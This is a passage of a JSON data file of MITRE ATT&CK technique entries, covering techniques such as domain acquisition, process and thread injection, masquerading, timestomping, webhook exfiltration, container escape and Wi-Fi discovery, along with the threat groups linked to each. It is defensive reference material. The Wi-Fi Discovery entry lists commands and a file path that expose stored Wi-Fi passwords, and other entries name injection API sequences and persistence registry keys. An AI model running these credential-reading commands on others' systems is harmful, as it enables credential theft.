Dragon"]},"T1583.001":{"id":"T1583.001","name":"Domains","description":"Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\n\nAdversaries may use acquired domains for a variety of purposes, including for [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), and Command and Control.^[[1]](https://us-cert.cisa.gov/ncas/alerts/aa20-258a)^ Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).^[[2]](https://web.archive.org/web/20151022204649/https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf)^^[[3]](https://www.zdnet.com/article/paypal-alert-beware-the-paypai-scam-5000109103/)^ Typosquatting may be used to aid in delivery of payloads via [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines.^[[4]](https://us-cert.cisa.gov/ncas/tips/ST05-016)^^[[5]](https://blog.talosintelligence.com/2022/03/transparent-tribe-new-campaign.html)^^[[6]](https://blog.talosintelligence.com/2021/05/transparent-tribe-infra-and-targeting.html)^^[[7]](https://web.archive.org/web/20220527112908/https://www.riskiq.com/blog/labs/ukraine-malware-infrastructure/)^^[[8]](https://web.archive.org/web/20171223000420/https://www.riskiq.com/blog/labs/lazarus-group-cryptocurrency/)^\n\nAdversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.^[[9]](https://www.mdsec.co.uk/2017/07/categorisation-is-not-a-security-boundary/)^^[[10]](https://krebsonsecurity.com/2018/11/that-domain-you-forgot-to-renew-yeah-its-now-stealing-credit-cards/)^^[[11]](https://www.cobaltstrike.com/blog/high-reputation-redirectors-and-domain-fronting/)^^[[12]](https://www.blackhillsinfosec.com/bypass-web-proxy-filtering/)^\n\nDomain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.^[[13]](https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf)^","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":["C0021","Operation Spalax","Operation Honeybee","Operation Dust Storm","Operation Dream Job","Operation Ghost","C0026","CostaRicto","C0010","C0011","FunnyDream","SolarWinds Compromise"],"groups":["APT28","TA505","HEXANE","APT1","APT32","IndigoZebra","Leviathan","Earth Lusca","Kimsuky","Dragonfly","TA2541","LazyScripter","Transparent Tribe","ZIRCONIUM","Threat Group-3390","Mustang Panda","Lazarus Group","EXOTIC LILY","Silent Librarian","FIN7","Magic Hound","Gamaredon Group","BITTER","TeamTNT","Sandworm Team","Winnti Group","Ferocious Kitten","menuPass","APT29","UNC2452"]},"T1560.002":{"id":"T1560.002","name":"Archive via Library","description":"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile ^[[1]](https://pypi.org/project/rarfile/)^, libzip ^[[2]](https://libzip.org/)^, and zlib ^[[3]](https://github.com/madler/zlib)^. Most libraries include functionality to encrypt and/or compress data.\n\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.","platforms":["Linux","macOS","Windows"],"tactics":["Collection"],"campaigns":[],"groups":["Lazarus Group","Threat Group-3390"]},"T1055.003":{"id":"T1055.003","name":"Thread Execution Hijacking","description":"Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as `OpenThread`. At this point the process can be suspended then written to, realigned to the injected code, and resumed via `SuspendThread `, `VirtualAllocEx`, `WriteProcessMemory`, `SetThreadContext`, then `ResumeThread` respectively.^[[1]](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)^\n\nThis is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) but targets an existing process rather than creating a process in a suspended state.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. ","platforms":["Windows"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":[],"groups":[]},"T1036":{"id":"T1036","name":"Masquerading","description":"Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).^[[1]](https://lolbas-project.github.io/)^ Masquerading may also include the use of [Proxy](https://attack.mitre.org/techniques/T1090) or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections.","platforms":["Linux","macOS","Windows","Containers"],"tactics":["Defense Evasion"],"campaigns":["Operation Dust Storm","SolarWinds Compromise","C0018","C0015","Operation Honeybee"],"groups":["menuPass","APT32","BRONZE BUTLER","OilRig","Nomadic Octopus","Kimsuky","TeamTNT","LazyScripter","Dragonfly","APT28","ZIRCONIUM","FIN13","Windshift","TA551","PLATINUM","APT29","UNC2452","Lazarus Group","Dragonfly 2.0","Mustang Panda"]},"T1546.011":{"id":"T1546.011","name":"Application Shimming","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. ^[[1]](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)^\n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* `%WINDIR%\\AppPatch\\sysmain.sdb` and\n* `hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb`\n\nCustom databases are stored in:\n\n* `%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom` and\n* `hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom`\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. ^[[2]](http://files.brucon.org/2015/Tomczak_and_Ballenthin_Shims_for_the_Win.pdf)^ Shims can also be abused to establish persistence by continuously being invoked by affected programs.","platforms":["Windows"],"tactics":["Privilege Escalation","Persistence"],"campaigns":[],"groups":["FIN7"]},"T1552":{"id":"T1552","name":"Unsecured Credentials","description":"Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)), or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).","platforms":["Windows","Azure AD","Office 365","SaaS","IaaS","Linux","macOS","Google Workspace","Containers","Network"],"tactics":["Credential Access"],"campaigns":[],"groups":[]},"T1547.010":{"id":"T1547.010","name":"Port Monitors","description":"Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the `AddMonitor` API call to set a DLL to be loaded at startup.^[[1]](http://msdn.microsoft.com/en-us/library/dd183341)^ This DLL can be located in `C:\\Windows\\System32` and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions.^[[2]](https://www.defcon.org/images/defcon-22/dc-22-presentations/Bloxham/DEFCON-22-Brady-Bloxham-Windows-API-Abuse-UPDATED.pdf)^ Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors`. \n\nThe Registry key contains entries for the following:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port\n\nAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":[]},"T1070.008":{"id":"T1070.008","name":"Clear Mailbox Data","description":"Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. \n\nAdversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of [Phishing](https://attack.mitre.org/techniques/T1566)/[Internal Spearphishing](https://attack.mitre.org/techniques/T1534), [Email Collection](https://attack.mitre.org/techniques/T1114), [Mail Protocols](https://attack.mitre.org/techniques/T1071/003) for command and control, or email-based exfiltration such as [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). For example, to remove evidence on Exchange servers adversaries have used the `ExchangePowerShell` [PowerShell](https://attack.mitre.org/techniques/T1059/001) module, including `Remove-MailboxExportRequest` to remove evidence of mailbox exports.^[[1]](https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/)^^[[2]](https://docs.microsoft.com/en-us/powershell/module/exchange/?view=exchange-ps#mailboxes)^ On Linux and macOS, adversaries may also delete emails through a command line utility called `mail`  or use [AppleScript](https://attack.mitre.org/techniques/T1059/002) to interact with APIs on macOS.^[[3]](https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf)^^[[4]](https://man7.org/linux/man-pages/man1/mailx.1p.html)^\n\nAdversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.^[[5]](https://www.microsoft.com/en-us/security/blog/2022/09/22/malicious-oauth-applications-used-to-compromise-email-servers-and-spread-spam/)^","platforms":["Linux","macOS","Windows","Office 365","Google Workspace"],"tactics":["Defense Evasion"],"campaigns":["SolarWinds Compromise"],"groups":["APT29"]},"T1037.002":{"id":"T1037.002","name":"Login Hook","description":"Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the `/Library/Preferences/com.apple.loginwindow.plist` file and can be modified using the `defaults` command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.^[[1]](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html)^^[[2]](https://developer.apple.com/documentation/devicemanagement/loginwindowscripts)^ \n\nAdversaries can add or insert a path to a malicious script in the `com.apple.loginwindow.plist` file, using the `LoginHook` or `LogoutHook` key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.^[[3]](https://www.sentinelone.com/blog/how-malware-persists-on-macos/)^^[[4]](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)^\n\n**Note:** Login hooks were deprecated in 10.11 version of macOS in favor of [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) ","platforms":["macOS"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":[]},"T1659":{"id":"T1659","name":"Content Injection","description":"Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.^[[1]](https://www.welivesecurity.com/en/eset-research/moustachedbouncer-espionage-against-foreign-diplomats-in-belarus/)^\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) ^[[2]](https://encyclopedia.kaspersky.com/glossary/man-in-the-middle-attack/)^\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server ^[[3]](https://usa.kaspersky.com/blog/man-on-the-side/27854/)^\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"^[[3]](https://usa.kaspersky.com/blog/man-on-the-side/27854/)^^[[1]](https://www.welivesecurity.com/en/eset-research/moustachedbouncer-espionage-against-foreign-diplomats-in-belarus/)^^[[4]](https://www.eff.org/deeplinks/2015/04/china-uses-unencrypted-websites-to-hijack-browsers-in-github-attack)^","platforms":["Linux","macOS","Windows"],"tactics":["Initial Access","Command and Control"],"campaigns":[],"groups":["MoustachedBouncer"]},"T1055":{"id":"T1055","name":"Process Injection","description":"Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":["Operation Wocao","Operation Sharpshooter","2015 Ukraine Electric Power Attack"],"groups":["Silence","APT32","Wizard Spider","TA2541","Cobalt Group","APT37","Kimsuky","PLATINUM","APT41","Turla","Honeybee","Operation Wocao","Sharpshooter"]},"T1567.004":{"id":"T1567.004","name":"Exfiltration Over Webhook","description":"Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server.^[[1]](https://www.redhat.com/en/topics/automation/what-is-a-webhook)^ Many public and commercial services, such as Discord, Slack, and `webhook.site`, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello.^[[2]](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)^ When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application. \n\nAdversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated [Automated Exfiltration](https://attack.mitre.org/techniques/T1020) of emails, chat messages, and other data.^[[3]](https://github.com/pushsecurity/saas-attacks/blob/main/techniques/webhooks/description.md)^ Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it.^[[4]](https://www.microsoft.com/security/blog/2023/10/03/defending-new-vectors-threat-actors-attempt-sql-server-to-cloud-lateral-movement/)^\n\nAccess to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.^[[5]](https://www.cyberark.com/resources/threat-research-blog/the-not-so-secret-war-on-discord)^^[[6]](https://blog.talosintelligence.com/collab-app-abuse/)^^[[7]](https://medium.com/checkmarx-security/webhook-party-malicious-packages-caught-exfiltrating-data-via-legit-webhook-services-6e046b07d191)^","platforms":["Windows","macOS","Linux","SaaS","Office 365","Google Workspace"],"tactics":["Exfiltration"],"campaigns":[],"groups":[]},"T1205":{"id":"T1205","name":"Traffic Signaling","description":"Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\n\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r ^[[1]](https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631)^, is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nOn network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.^[[2]](https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices)^^[[3]](https://www.mandiant.com/resources/synful-knock-acis)^^[[4]](https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954)^  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.\n\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.^[[5]](https://www.bleepingcomputer.com/news/security/ryuk-ransomware-uses-wake-on-lan-to-encrypt-offline-devices/)^^[[6]](https://www.amd.com/system/files/TechDocs/20213.pdf)^","platforms":["Linux","macOS","Windows","Network"],"tactics":["Defense Evasion","Persistence","Command and Control"],"campaigns":[],"groups":[]},"T1021.008":{"id":"T1021.008","name":"Direct Cloud VM Connections","description":"Adversaries may leverage [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log directly into accessible cloud hosted compute infrastructure through cloud native methods. Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through the [Cloud API](https://attack.mitre.org/techniques/T1059/009), such as Azure Serial Console^[[1]](https://learn.microsoft.com/en-us/troubleshoot/azure/virtual-machines/serial-console-overview)^, AWS EC2 Instance Connect^[[2]](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-connect-methods.html)^^[[3]](https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud)^, and AWS System Manager.^[[4]](https://docs.aws.amazon.com/systems-manager/latest/userguide/what-is-systems-manager.html)^.\n\nMethods of authentication for these connections can include passwords, application access tokens, or SSH keys. These cloud native methods may, by default, allow for privileged access on the host with SYSTEM or root level access. \n\nAdversaries may utilize these cloud native methods to directly access virtual infrastructure and pivot through an environment.^[[5]](https://www.mandiant.com/resources/blog/sim-swapping-abuse-azure-serial)^ These connections typically provide direct console access to the VM rather than the execution of scripts (i.e., [Cloud Administration Command](https://attack.mitre.org/techniques/T1651)).","platforms":["IaaS"],"tactics":["Lateral Movement"],"campaigns":[],"groups":[]},"T1218":{"id":"T1218","name":"System Binary Proxy Execution","description":"Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.^[[1]](https://github.com/LOLBAS-Project/LOLBAS#criteria)^ Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.\n\nSimilarly, on Linux systems adversaries may abuse trusted binaries such as `split` to proxy execution of malicious commands.^[[2]](https://man7.org/linux/man-pages/man1/split.1.html)^^[[3]](https://gtfobins.github.io/gtfobins/split/)^","platforms":["Windows","Linux","macOS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Lazarus Group"]},"T1070.006":{"id":"T1070.006","name":"Timestomp","description":"Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.^[[1]](http://windowsir.blogspot.com/2013/07/howto-determinedetect-use-of-anti.html)^","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":["SolarWinds Compromise"],"groups":["APT28","APT38","APT32","Kimsuky","APT29","TEMP.Veles","Chimera","Lazarus Group","Rocke","UNC2452"]},"T1620":{"id":"T1620","name":"Reflective Code Loading","description":"Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk. Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).^[[1]](https://thewover.github.io/Introducing-Donut/)^^[[2]](https://www.sentinelone.com/blog/building-a-custom-tool-for-shellcode-analysis/)^^[[3]](https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html)^^[[4]](https://0x00sec.org/t/super-stealthy-droppers/3715)^^[[5]](https://www.mandiant.com/resources/bring-your-own-land-novel-red-teaming-technique)^\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.^[[3]](https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html)^^[[4]](https://0x00sec.org/t/super-stealthy-droppers/3715)^^[[6]](https://www.intezer.com/blog/research/acbackdoor-analysis-of-a-new-multiplatform-backdoor/)^^[[7]](https://www.sentinelone.com/blog/teaching-an-old-rat-new-tricks/)^","platforms":["macOS","Linux","Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Lazarus Group"]},"T1016.002":{"id":"T1016.002","name":"Wi-Fi Discovery","description":"Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of [Account Discovery](https://attack.mitre.org/techniques/T1087), [Remote System Discovery](https://attack.mitre.org/techniques/T1018), and other discovery or [Credential Access](https://attack.mitre.org/tactics/TA0006) activity to support both ongoing and future campaigns.\n\nAdversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available through `netsh wlan show profiles` to enumerate Wi-Fi names and then `netsh wlan show profile “Wi-Fi name” key=clear` to show a Wi-Fi network’s corresponding password.^[[1]](https://www.bleepingcomputer.com/news/security/hackers-steal-wifi-passwords-using-upgraded-agent-tesla-malware/)^^[[2]](https://www.malwarebytes.com/blog/news/2020/04/new-agenttesla-variant-steals-wifi-credentials)^^[[3]](https://research.checkpoint.com/2022/apt35-exploits-log4j-vulnerability-to-distribute-new-modular-powershell-toolkit/)^ Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls to `wlanAPI.dll` [Native API](https://attack.mitre.org/techniques/T1106) functions.^[[4]](https://www.binarydefense.com/resources/blog/emotet-evolves-with-new-wi-fi-spreader/)^\n\nOn Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under ` /etc/NetworkManager/system-connections/`.^[[5]](https://www.geeksforgeeks.org/wi-fi-password-connected-networks-windowslinux/)^ On macOS, the password of a known Wi-Fi may be identified with ` security find-generic-password -wa wifiname` (requires admin username/password).^[[6]](https://mackeeper.com/blog/find-wi-fi-password-on-mac/)^\n","platforms":["Linux","macOS","Windows"],"tactics":["Discovery"],"campaigns":[],"groups":["Magic Hound"]},"T1564.011":{"id":"T1564.011","name":"Ignore Process Interrupts","description":"Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.^[[1]](https://man7.org/linux/man-pages/man7/signal.7.html)^  These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes. \n\nAdversaries may invoke processes using `nohup`, [PowerShell](https://attack.mitre.org/techniques/T1059/001) `-ErrorAction SilentlyContinue`, or similar commands that may be immune to hangups.^[[2]](https://linux.die.net/man/1/nohup)^^[[3]](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_preference_variables?view=powershell-7.3#debugpreference)^ This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection.\n\nHiding from process interrupt signals may allow malware to continue execution, but unlike [Trap](https://attack.mitre.org/techniques/T1546/005) this does not establish [Persistence](https://attack.mitre.org/tactics/TA0003) since the process will not be re-invoked once actually terminated.","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1611":{"id":"T1611","name":"Escape to Host","description":"Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.^[[1]](https://docs.docker.com/get-started/overview/)^\n\nThere are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.^[[2]](https://docs.docker.com/storage/bind-mounts/)^^[[3]](https://www.trendmicro.com/en_us/research/19/l/why-running-a-privileged-container-in-docker-is-a-bad-idea.html)^^[[4]](https://www.intezer.com/blog/cloud-security/watch-your-containers-doki-infecting-docker-servers-in-the-cloud/)^^[[5]](https://0xn3va.gitbook.io/cheat-sheets/container/escaping)^^[[6]](https://www.crowdstrike.com/blog/cve-2022-0185-kubernetes-container-escape-using-linux-kernel-exploit/)^^[[7]](https://www.antitree.com/2020/07/keyctl-unmask-going-florida-on-the-state-of-containerizing-linux-keyrings/)^\n\nAdditionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).^[[5]](https://0xn3va.gitbook.io/cheat-sheets/container/escaping)^ Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.^[[8]](https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/)^\n\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host.","platforms":["Windows","Linux","Containers"],"tactics":["Privilege Escalation"],"campaigns":[],"groups":["TeamTNT"]},"T1547.009":{"id":"T1547.009","name":"Shortcut Modification","description":"Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176)) to persistently launch malware.","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":["APT39","Leviathan","Lazarus Group","Gorgon Group","Dragonfly","APT29","Darkhotel","Dragonfly 2.0"]},"T1010":{"id":"T1010","name":"Application Window Discovery","description":"Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used.^[[1]](https://www.prevailion.com/darkwatchman-new-fileless-techniques/)^ For example, information about application windows could be used identify potential data to collect as well as identifying security tooling ([Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) to evade.^[[2]](https://www.welivesecurity.com/2020/04/28/grandoreiro-how-engorged-can-exe-get/)^\n\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) commands and [Native API](https://attack.mitre.org/techniques/T1106) 